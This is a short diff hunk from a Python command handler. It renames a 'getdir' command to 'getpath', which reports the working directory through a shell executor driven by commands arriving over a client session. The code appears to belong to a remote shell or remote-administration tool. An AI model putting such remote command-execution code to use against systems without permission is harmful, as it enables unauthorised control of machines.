@@ -37,7 +37,7 @@ def process_commands(client_session):
             client_session.send(f'[*] Path changed to: {" ".join(command[2:])}')
             return
         process_exec(client_session, " ".join(command[1:]))
-    elif command[0] == "getdir":
+    elif command[0] == "getpath":
         if platform.system() == "Windows":
             process_exec(client_session, "cd")
         else: process_exec(client_session, "pwd")
